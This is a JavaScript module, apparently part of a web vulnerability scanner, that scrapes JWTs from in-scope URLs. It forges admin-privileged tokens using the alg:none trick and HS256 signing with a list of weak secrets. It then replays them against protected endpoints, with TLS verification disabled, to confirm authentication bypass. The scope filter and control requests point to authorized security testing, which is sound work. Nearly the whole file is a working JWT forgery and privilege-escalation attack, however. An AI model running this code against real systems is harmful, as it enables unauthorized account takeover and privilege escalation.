const crypto = require('crypto');
const { BaseModule, ModuleResult } = require('./base');
const { pushInsecureTLS, popInsecureTLS } = require('../tls_guard');

const b64url = (b) => Buffer.from(b).toString('base64').replace(/=+$/g, '').replace(/\+/g, '-').replace(/\//g, '_');
const hs256 = (data, secret) => crypto.createHmac('sha256', secret).update(data).digest('base64').replace(/=+$/g, '').replace(/\+/g, '-').replace(/\//g, '_');
const JWT_RE = /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/;
const WEAK_SECRETS = ['secret', 'password', '123456', 'key', 'jwt', 'admin', 'changeme', 'secretkey', 'token', 'test'];

// Find a JWT, then try to forge a privileged token the server will accept:
// alg:none (no signature) and HS256 signed with a weak/guessable secret.
class JwtConfirm extends BaseModule {
  static moduleName = 'jwt_confirm';
  static phase = 'P6c';
  static toolsNeeded = [];

  async execute() {
    const urls = [...new Set([...this.workspace.readLines('urls.txt'), ...this.workspace.readLines('live.txt')])]
      .filter(u => { try { return this.scope.inScope(new URL(u).hostname); } catch { return false; } });
    if (!urls.length) return new ModuleResult({ module: JwtConfirm.moduleName, status: 'skipped', errors: ['No URLs'] });
    const ua = this.config.user_agent || 'WebKiller/3.0';
    const confirmed = [];
    pushInsecureTLS();
    try {
      // 1. Try to obtain a real JWT from login-ish endpoints (header/body/cookie).
      const loginish = urls.filter(u => /login|signin|token|auth|session/i.test(u));
      let seedPayload = { user: 'admin', role: 'admin', admin: true };
      for (const u of [...loginish, ...urls].slice(0, 15)) {
        try {
          const r = await fetch(u, { headers: { 'User-Agent': ua }, signal: AbortSignal.timeout(6000) });
          const txt = await r.text();
          const hay = txt + ' ' + (r.headers.get('set-cookie') || '');
          const m = hay.match(JWT_RE);
          if (m) { try { seedPayload = { ...JSON.parse(Buffer.from(m[0].split('.')[1].replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString()), role: 'admin', admin: true }; } catch { /* keep default */ } break; }
        } catch { /* skip */ }
      }

      // 2. Forge candidate tokens.
      const h = b64url(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
      const p = b64url(JSON.stringify(seedPayload));
      const forged = [{ how: 'alg:none', tok: `${b64url(JSON.stringify({ alg: 'none', typ: 'JWT' }))}.${p}.` }];
      for (const s of WEAK_SECRETS) forged.push({ how: `weak-secret:${s}`, tok: `${h}.${p}.${hs256(`${h}.${p}`, s)}` });

      // 3. Replay against protected-looking endpoints.
      const prot = [...new Set(urls.filter(u => /jwt|profile|account|\/me(\b|$)|admin|dashboard|user/i.test(u)).map(stripQuery))];
      const privRe = (t) => /"admin"\s*:\s*true/i.test(t) || /"role"\s*:\s*"admin"/i.test(t);
      for (const ep of prot.slice(0, 20)) {
        let baseStatus = 0, garbageStatus = 0, baseText = '', garbageText = '';
        try { const b = await fetch(ep, { headers: { 'User-Agent': ua }, signal: AbortSignal.timeout(6000) }); baseStatus = b.status; baseText = await b.text(); } catch { /* ignore */ }
        // Control: a structurally-invalid token. If the endpoint accepts THIS too,
        // or already shows admin markers unauthenticated, "forged accepted" is not forgery.
        try { const g = await fetch(ep, { headers: { 'User-Agent': ua, Authorization: 'Bearer not.a.jwt' }, signal: AbortSignal.timeout(6000) }); garbageStatus = g.status; garbageText = await g.text(); } catch { /* ignore */ }
        const basePriv = privRe(baseText) || privRe(garbageText);
        for (const f of forged) {
          try {
            const r = await fetch(ep, { headers: { 'User-Agent': ua, Authorization: 'Bearer ' + f.tok }, signal: AbortSignal.timeout(6000) });
            const body = await r.text();
            const priv = privRe(body) && !basePriv;
            const unlocked = r.status === 200 && baseStatus >= 400 && garbageStatus >= 400;
            if (priv || unlocked) {
              confirmed.push({ name: `JWT auth bypass (${f.how})`, severity: 'critical', url: ep, evidence: { method: f.how, note: 'forged token accepted — authentication bypass / privilege escalation' }, type: 'dast_confirmed', vuln_class: 'jwt', module: JwtConfirm.moduleName });
              break;
            }
          } catch { /* skip */ }
        }
      }
    } finally { popInsecureTLS(); }
    const out = dedup(confirmed);
    if (out.length) { this.workspace.appendJsonl('confirmed.jsonl', out); this.workspace.appendJsonl('findings.jsonl', out); }
    return new ModuleResult({ module: JwtConfirm.moduleName, items: out.map(c => c.url), records: out, toolUsed: 'jwt-forge' });
  }
}
function stripQuery(u) { try { const p = new URL(u); return p.origin + p.pathname; } catch { return u; } }
function dedup(arr) { const s = new Set(); return arr.filter(c => { if (s.has(c.url)) return false; s.add(c.url); return true; }); }
module.exports = JwtConfirm;
